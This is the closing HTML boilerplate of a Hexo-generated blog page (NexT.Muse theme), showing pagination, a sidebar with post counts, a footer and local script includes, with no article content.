      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/47/">&lt;</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/47/">47</a><span class="page-number current">48</span><a class="page-number" href="/page/49/">49</a><span class="space">&hellip;</span><a class="page-number" href="/page/82/">82</a><a class="extend next" rel="next" href="/page/49/">&gt;</a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name"></p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/%7C%7C%20archive">
              
                  <span class="site-state-item-count">1622</span>
                  <span class="site-state-item-name">posts</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">71</span>
                  <span class="site-state-item-name">categories</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">914</span>
                  <span class="site-state-item-name">tags</span>
                </a>
              </div>
            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Laird Lau</span>

  
</div>


  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
